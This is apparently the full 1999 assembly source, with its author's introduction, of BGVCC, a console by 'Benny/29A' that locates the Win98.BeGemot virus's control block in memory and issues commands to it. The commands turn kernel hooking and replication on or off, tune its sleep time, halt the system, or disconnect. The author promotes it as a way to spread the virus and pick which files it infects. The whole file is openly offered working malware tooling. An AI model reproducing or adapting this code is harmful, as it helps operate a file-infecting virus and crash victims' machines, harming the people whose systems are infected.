   ;                                                     ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;   ÚÄ BeGemot Virus Communication Console Ä¿         ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;   ³                   by                  ³          ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄ Benny / 29A ÄÄÄÄÄÄÄÄÄÄÄÄÄÙ         ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;                                                     ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ;
   ;
   ;Hello everybody,
   ;
   ;let me introduce BGVCC, interface which will allow u to communicate with my
   ;Win98.BeGemot virus (see its description). Yeah, this is the first try to
   ;create comm. interface for any virus ever. By this utility u can easily
   ;control all virus actions, which BeGemot does. Bah, u can do many things
   ;with this. BGVCC is only 8192 bytes !!! Just read.
   ;
   ;After execution, BGVCC will try to find base address of BeGemot Control Block.
   ;If BGCB won't be found, BGVCC will quit with error. Otherwise it will
   ;remember base address, print prompt and wait for your commands. U can write
   ;commands by typin' numbers from '0' to '9' or pressin' ESCape key.
   ;
   ;Command list:
   ;
   ;               ESC     -       Quits BGVCC.
   ;               '0'     -       BGVCC will show ya, if BGCB is present or not.
   ;               '1'     -       BGVCC will show ya, what BG actualy does.
   ;               '2'     -       U can disable all virus activities in memory
   ;                               by this command.
   ;               '3'     -       U can enable all virus activities in memory,
   ;                               previously disabled, by this command.
   ;               '4'     -       BGVCC will show you sleep time value. Sleep
   ;                               time is time, how long will be thread suspended,
   ;                               i.e. how long won't be commited CPU time to
   ;                               thread.
   ;               '5'     -       By this command u can increase sleep time.
   ;               '6'     -       By this command u can decrease sleep time.
   ;               '7'     -       This command will switch unit for increasin'
   ;                               and decreasin' sleep time to 100 or 1000
   ;                               miliseconds.
   ;               '8'     -       By this u can totaly halt system. Why?
   ;                               Why not? X-D
   ;               '9'     -       Last command is useful too. This will erase
   ;                               BGCB from memory and suspend thread for actual
   ;                               session. After this it won't be able to
   ;                               connect to BGCB again (only after restart).
   ;
   ;If BGVCC will get to freeze state, press Ctrl+C or Ctrl+Break to quit.
   ;
   ;
   ;Well, why did I code this ? It's easy. It helped me with testin' my virus.
   ;Now, in the final version, u can control all virus activities. U can easily
   ;spread out BeGemot virus, u can also control, which files will be infected
   ;and which not. If u will experiment with this, u will find many of these
   ;features useful. Heh, but why would u do that ? X-DDD
   ;
   ;
   ;
   ;Benny/29A (c) 1999. Enjoy!



   .386p                                           ;386 protected mode opcodes
   .model flat                                     ;flat model (32bit offset)
                                                   ;no segment
   include win32api.inc                            ;some include file


   BGCB_Signature  equ     00                      ;some equates
   BGCB_New    equ 04
   BGCB_ID     equ 08
   BGCB_Data   equ 12

   BG_IDLE         equ     0                       ;virus state
   BG_INFECTINEXEC equ 1
   BG_INFECTINRAR  equ 2
   BG_STEALTHIN    equ 3

   extrn AllocConsole:PROC                         ;API functions
   extrn SetConsoleTitleA:PROC
   extrn GetStdHandle:PROC
   extrn SetConsoleCursorInfo:PROC
   extrn WriteConsoleA:PROC
   extrn ReadConsoleInputA:PROC
   extrn PeekConsoleInputA:PROC
   extrn ExitProcess:PROC


   ;data section
   .data
       ConTitle    db  '[BGVCC] - BeGemot Virus Comunication Console by Benny/29A',0
       msgStart    db  '- Performin'' search for base adress of [BGCB].',0ah
               db  '  This can take a while. Please wait...',0ah
       msgStartSize = $-msgStart

       msgError    db  '- Base address not found, [BGCB] isn''t present at memory.', 0ah
               db  '  Press [ESC] key to quit...'
       msgErrorSize = $-msgError

       msgOK       db  '- Base address found at '
       w_hex       db  '00000000h.',0ah
               db      'ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ',0ah,0ah
       msgOKSize = $-msgOK

       msgCheck    db  '- [BGVCC] is now checkin'' [BGCB] memory presency...',0ah
       msgCheckSize = $-msgCheck

       msgFOut     db  '- [BG] is '
       msgCOutSize = $ - msgFOut
       @id:
               db  '                     ',0ah
       msgFOutSize = $ - msgFOut
       idSize = $ - @id

       msgAction   db  '- [BGVCC] is now checkin'' [BG]''s state...',0ah
       msgActionSize = $ - msgAction

       msgKill     db  '- [BG] will now halt system. R u sure, u wanna do this? [Y/N]',0ah
       msgKillSize = $ - msgKill

       msgKilled   db  'ÄÄÄ> C Ya In Da HeLl!',0ah
       msgKilledSize = $ - msgKilled

       msgDisable  db  '- [BG] will now unhook kernel calls, all replication actions will be disabled.',0ah
               db  '  R u sure u wanna do this? [Y/N]',0ah
       msgDisableSize = $ - msgDisable

       msgDisabled db  '- [BG] is now unhooked of all kernel calls.',0ah
       msgDisabledSize = $ - msgDisabled

       msgEnable   db  '- [BG] will now hook kernel calls, all replication actions will be enabled.',0ah
               db  '  R u sure u wanna do this? [Y/N]',0ah
       msgEnableSize = $ - msgEnable

       msgEnabled  db  '- [BG] is now hooked to all kernel calls.',0ah
       msgEnabledSize = $ - msgEnabled

       msgDisc     db  '- [ATTENTION] Connection will be canceled. It won''t be possible to connect',0ah
               db  '  later! Proceed? [Y/N]',0ah
       msgDiscSize = $ - msgDisc

       msgGTime    db  '- [BGVCC] is now checkin'' [BG]''s sleep time...',0ah
       msgGTimeSize = $ - msgGTime

       msgGTime2   db  '- [BG]''s sleep time is '
       curTime     db  '00000000h miliseconds (default 3E8h = 1 second).',0ah
       msgGTime2Size = $ - msgGTime2

       msgITime    db  '- [BGVCC] is increasin'' sleep time of [BG]...',0ah
       msgITimeSize = $ - msgITime

       msgDTime    db  '- [BGVCC] is decreasin'' sleep time of [BG]...',0ah
       msgDTimeSize = $ - msgDTime

       msgSUnit    db  '- Unit for changin'' sleep time is now '
       sUnitVal    db  '100 ',0ah
       msgSUnitSize = $ - msgSUnit

       msgWait     db  '-',0ah
               db  '- [BGVCC] is now waitin'' for your commands. Press ID number or [ESC] key...',0ah
       msgWaitSize = $ - msgWait

           ;Virus states
       idPresent   db  'PrEsEnT              ',0ah
       idnPresent  db  'NoT-PrEsEnT          ',0ah
       idIdle      db  'IdLe                 ',0ah
       idInfEXE    db  'InFeCtIn'' ExEcUtAbLe ',0ah
       idInfRAR    db  'InFeCtIn'' RAR        ',0ah
       idStealth   db  'StEaLtHiN''           ',0ah
       idError     db  'UnKnOwN AcTiOn',0ah

           cursor          dd      1               ;console cursor
               db  0
           bAddress        dd      80000000h       ;startin address
           sUnit           dd      100             ;unit for changin sleep time
           bckAddress      dd      ?               ;jump address used in SEH
           handle          dd      ?               ;standard output
           temp            dd      ?               ;temporary
           inputEvent      db      10h dup (?)     ;input event
   ends

   .code                                           ;code section
   Start:                                          ;code begin here
   SEH_hndlr macro                                 ;macro for SEH
           @SEH_RemoveFrame                        ;remove SEH frame
           add dword ptr [bAddress], 1000h         ;explore next page (next 4096 bytes)
           jmp [bckAddress]                        ;continue execution
   endm

           call AllocConsole                       ;create console window

       push offset ConTitle
           call SetConsoleTitleA                   ;set console title

           push -11
           call GetStdHandle                       ;get standard output
           mov [handle], eax                       ;save it

       push offset cursor
       push eax
           call SetConsoleCursorInfo               ;disable console cursor

       push msgStartSize
       push offset msgStart
           call print                              ;display message

           mov [bckAddress], offset bck            ;set jump address
   bck:    @SEH_SetupFrame <SEH_hndlr>             ;setup SEH frame
           mov eax, [bAddress]                     ;get address
           cmp eax, 0c0000000h                     ;is it limit?
           je not_found                            ;yeah, print message and quit
           cmp [eax.BGCB_Signature], 'BCGB'        ;check signature
           jne not_BGCB                            ;baaaad
           cmp dword ptr [eax.BGCB_New], 0         ;next check
           je got_BGCB                             ;got address

   not_BGCB:                                       ;incorrect address, cause GP
           cdq                                     ;fault and so jump to SEH
           inc dword ptr [edx]                     ;handler
   not_found:                                      ;address not found
           @SEH_RemoveFrame                        ;remove SEH frame
           push msgErrorSize
       push offset msgError
           call print                              ;display message
   e_error:call GetChar                            ;get key
           cmp al, 27                              ;wait for ESC (27)
       jne e_error

           push 1                                  ;set error code
           jmp _end_
   end:    push 0
   _end_:  call ExitProcess                        ;and quit

   got_BGCB:                                       ;we got address
           mov edi, offset w_hex
           call HexWrite                           ;convert number to string

       push msgOKSize
       push offset msgOK
           call print                              ;and display address

           mov ebx, [bAddress]                     ;EBX=address of BGCB
           call Check4Presency                     ;presency check

           @SEH_SetupFrame <jmp not_found>         ;Setup SEH frame
   id_get: push msgWaitSize
       push offset msgWait
           call print                              ;print message
   id_lbl: call DblGtChr                           ;get char
       cmp al, '0'             ;presency check
       je @pCheck
           cmp al, '1'                             ;state check
       je @sCheck
       cmp al, '2'             ;disable virus action
       je @dAction
       cmp al, '3'             ;enable virus action
       je @eAction
       cmp al, '4'             ;get sleep time
       je @gSleep
       cmp al, '5'             ;increase sleep time
       je @iSleep
       cmp al, '6'             ;decrease sleep time
       je @dSleep
           cmp al, '7'                             ;set sleep time unit
       je @uSleep
       cmp al, '8'             ;system halt
       je @sHalt
       cmp al, '9'             ;disconnect
       je @disconnect
       cmp al, 27              ;ESC
       je end
           jmp id_lbl

   @pCheck:call Check4Presency                     ;presency check
       jmp id_get

   @sCheck:
       push msgActionSize
       push offset msgAction
           call print                              ;print message
           xor eax, eax                            ;EAX=0
           inc eax                                 ;EAX=1
           mov [ebx.BGCB_ID], eax                  ;ID=1
           lea edx, [ebx.BGCB_New]                 ;load New item
           mov [edx], eax                          ;New=1
   wait_loop4:
           cmp [edx], eax                          ;is it 1?
           je wait_loop4                           ;yeah, wait
           mov esi, offset idIdle                  ;load string
           mov edi, offset msgFOut+msgCOutSize     ;destination place
           mov ecx, [ebx.BGCB_Data]                ;get Data item
           jecxz n_action                          ;is it 0 ?
           cmp cl, BG_INFECTINEXEC                 ;no, is it BG_INFECTINEXEC ?
           jne i_rar
           add esi, idSize                         ;yeah, load string
       jmp n_action
   i_rar:  cmp cl, BG_INFECTINRAR                  ;no, is it BG_INFECTINRAR ?
       jne i_stlt
           add esi, 2*idSize                       ;yeah, load string
       jmp n_action
   i_stlt: cmp cl, BG_STEALTHIN                    ;no, is it BG_STEALTHIN ?
       je i_error
           add esi, 3*idSize                       ;no, load string
   n_action:
           lodsb                                   ;load byte
           stosb                                   ;store byte
           cmp al, 0ah                             ;end of string reached ?
           jne n_action                            ;no, continue
       push msgFOutSize
       push offset msgFOut
           call print                              ;print message
       jmp id_get
   i_error:add esi, 4*idSize                       ;load string
       jmp n_action

   @dAction:                                       ;disable virus action
       push msgDisableSize
       push offset msgDisable
           call print                              ;print message
           call DblGtChr                           ;get char
           cmp al, 'Y'                             ;is it 'Y'
       je DiSaBlE
           cmp al, 'y'                             ;is it 'y'
           jne id_get
   DiSaBlE:mov byte ptr [ebx.BGCB_ID], 2           ;ID=2
           mov byte ptr [ebx.BGCB_New], 1          ;New=1
       push msgDisabledSize
       push offset msgDisabled
           call print                              ;print message
       jmp id_get

   @eAction:                                       ;enable virus action
       push msgEnableSize
       push offset msgEnable
           call print                              ;print message
           call DblGtChr                           ;get char
           cmp al, 'Y'                             ;is it 'Y'
       je @EnAbLe
           cmp al, 'y'                             ;is it 'y'
           jne id_get
   @EnAbLe:mov byte ptr [ebx.BGCB_ID], 3           ;ID=3
           mov byte ptr [ebx.BGCB_New], 1          ;New=1
       push msgEnabledSize
       push offset msgEnabled
           call print                              ;print message
       jmp id_get

   @dSleep:push msgDTimeSize                       ;decrement sleep time
       push offset msgDTime
           call print                              ;print message
           mov byte ptr [ebx.BGCB_ID], 6           ;ID=6
       jmp isleep

   @iSleep:push msgITimeSize                       ;increment sleep time
       push offset msgITime
           call print                              ;print message
           mov byte ptr [ebx.BGCB_ID], 5           ;ID=5
   isleep: mov eax, [sUnit]                        ;get unit
           mov [ebx.BGCB_Data], eax                ;Data=unit
           lea eax, [ebx.BGCB_New]                 ;load address of New item
           mov byte ptr [eax], 1                   ;New=1
   wait_loop1:
           cmp byte ptr [eax], 1                   ;is New=1 ?
           je wait_loop1                           ;yeah, wait

   @gSleep:push msgGTimeSize
       push offset msgGTime
           call print                              ;print message
           mov byte ptr [ebx.BGCB_ID], 4           ;ID=4
           mov byte ptr [ebx.BGCB_New], 1          ;New=1
   wait_loop2:
           cmp byte ptr [ebx.BGCB_New], 0          ;is New=0 ?
           jne wait_loop2                          ;no, wait
           mov eax, [ebx.BGCB_Data]                ;get Data item
       mov edi, offset curTime
           call HexWrite                           ;convert it to string
       push msgGTime2Size
       push offset msgGTime2
           call print                              ;print message
       jmp id_get

   @uSleep:cmp [sUnit], 100                        ;set sleep time unit
           jne thsnd                               ;is it 100
           mov [sUnit], 1000                       ;yeah, set it to 1000
           mov dword ptr [sUnitVal], '0001'        ;set string to '1000'
       jmp a_sleep
   thsnd:  mov [sUnit], 100                        ;no, change it to 100
           mov dword ptr [sUnitVal], ' 001'        ;set string to '100 '
   a_sleep:push msgSUnitSize
       push offset msgSUnit
           call print                              ;print message
       jmp id_get

   @sHalt: push msgKillSize                        ;system halt
       push offset msgKill
           call print                              ;print message
           call DblGtChr                           ;get char
           cmp al, 'Y'                             ;is it 'Y'
       je KiLlPc
           cmp al, 'y'                             ;is it 'y'
           jne id_get
   KiLlPc: push msgKilledSize
       push offset msgKilled
           call print                              ;print message
           mov byte ptr [ebx.BGCB_ID], 7           ;ID=7
           mov byte ptr [ebx.BGCB_New], 1          ;New=1
   k_end:  jmp k_end

   @disconnect:                                    ;disconnect
       push msgDiscSize
       push offset msgDisc
           call print                              ;print message
           call DblGtChr                           ;get char
           cmp al, 'Y'                             ;is it 'Y'
       je DiScOnNeCt
           cmp al, 'y'                             ;is it 'y'
           jne id_get
   DiScOnNeCt:
           mov byte ptr [ebx.BGCB_ID], 8           ;ID=8
           mov byte ptr [ebx.BGCB_New], 1          ;New=1
       push msgDiscSize
       push offset msgDisc
           call print                              ;print message
       jmp id_get

   Check4Presency proc                             ;check for presency
       push msgCheckSize
       push offset msgCheck
           call print                              ;print message
       xor eax, eax
           mov [ebx.BGCB_ID], eax                  ;ID=0
       inc eax
           lea edx, [ebx.BGCB_New]                 ;load New item
           mov [edx], eax                          ;New=1
   wait_loop3:
           cmp [edx], eax                          ;is New=1 ?
           je wait_loop3                           ;yeah, wait
           mov esi, offset idnPresent              ;load string
           mov edi, offset msgFOut+msgCOutSize     ;destination place
           mov ecx, [ebx.BGCB_Data]                ;load Data item
           jecxz n_present                         ;is it 0 ?
           mov esi, offset idPresent               ;no, load next string
   n_present:
           lodsb                                   ;load byte
           stosb                                   ;store byte
           cmp al, 0ah                             ;end of string reached ?
           jne n_present                           ;no, continue
       push msgFOutSize
       push offset msgFOut
           call print                              ;print message
       ret
   Check4Presency EndP

   print:  push 0                                  ;print message
           push offset temp                        ;push property parameters
       push dword ptr [esp+10h]
       push dword ptr [esp+10h]
       push dword ptr [handle]
           call WriteConsoleA                      ;write characters to console
           ret 8                                   ;output

   GetStd: push -10                                ;get standard input
           call GetStdHandle                       ;...
       ret

   GetChar:call GetStd                             ;get standard input
       push offset temp
       push 1
       push offset inputEvent
       push eax
           call ReadConsoleInputA                  ;get input event
           cmp byte ptr [inputEvent], 1            ;is it keyboard event ?
           jne GetChar                             ;no, get it again
           mov al, [inputEvent+14]                 ;load ascii char
           mov [inputEvent+14], 0                  ;reset variable
       ret

   DblGtChr:                                       ;double get char
           call GetChar                            ;get first char
           jmp GetChar                             ;get second char

   HexWrite:                                       ;I found this procedure in
           pushad                                  ;TASM5 Win32 aplication
           push    eax                             ;writin tutorial. Very useful!
           shr     eax, 16
           call    HexW16
           pop     eax
           call    HexW16
       popad
           ret
   HexW16: push    eax
           xchg    al,ah
           call    HexWrite8
           pop     eax
           call    HexWrite8
           ret
   HexWrite8 proc
           mov     ah, al
           and     al, 0fh
           shr     ah, 4
           or      ax, 3030h
           xchg    al, ah
           cmp     ah, 39h
           ja      @@4
   @@1:    cmp     al, 39h
           ja      @@3
   @@2:    stosw
           ret
   @@3:    sub     al, 30h
           add     al, 'A' - 10
           jmp     @@2
   @@4:    sub     ah, 30h
           add     ah, 'A' - 10
           jmp     @@1
   HexWrite8 EndP
   ends
   End Start
